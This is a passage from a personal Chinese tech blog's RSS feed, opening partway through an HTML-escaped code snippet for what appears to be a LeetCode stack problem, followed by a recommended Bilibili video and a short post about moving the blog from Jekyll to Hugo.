class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hold&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hold&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stackTop&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;peek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stack&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;push&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;p&gt;最后推荐一个大佬的视频，这个大佬每次周赛都是前几名




&lt;div&gt;&lt;iframe id=&#34;biliplayer&#34; src=&#34;https://xuoneyuan.github.io//player.bilibili.com/player.html?bvid=BV1Qg411q7ia&amp;page=1&#34; scrolling=&#34;no&#34; border=&#34;0&#34; frameborder=&#34;no&#34; framespacing=&#34;0&#34; allowfullscreen=&#34;true&#34; loading=&#34;lazy&#34; &gt; &lt;/iframe&gt;&lt;/div&gt;

&lt;style&gt;
    
    #biliplayer {
      width: 100%;
      height: 550px;
    }
    @media only screen and (min-device-width: 320px) and (max-device-width: 480px) {
      #biliplayer {
        width: 100%;
        height: 250px;
      }
    }
    &lt;/style&gt;
    &lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E7%AE%97%E6%B3%95/">算法</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E7%AE%97%E6%B3%95/">算法</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/leetcode/">leetcode</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>哇咔咔，我又回来了</title>
                <link>https://xuoneyuan.github.io/posts/1/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/1/</guid>
                <pubDate>Wed, 08 Nov 2023 20:48:18 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;如标题所见，时隔100天，我又开始记录我自己的博客了&lt;/p&gt;
&lt;p&gt;这次我更换了框架，使用了hugo替换了之前的Jekyll，这一改变会让我写博客更加高效简洁&lt;/p&gt;
&lt;p&gt;写下这段文字的时候网站应该还属于测试阶段，不过马上就要上线了，敬请期待&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E6%9D%82%E6%96%87/">杂文</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E6%97%A5%E5%B8%B8/">日常</category>
                                
                            
                        
                    
                
            </item>
        
    </channel>
</rss>
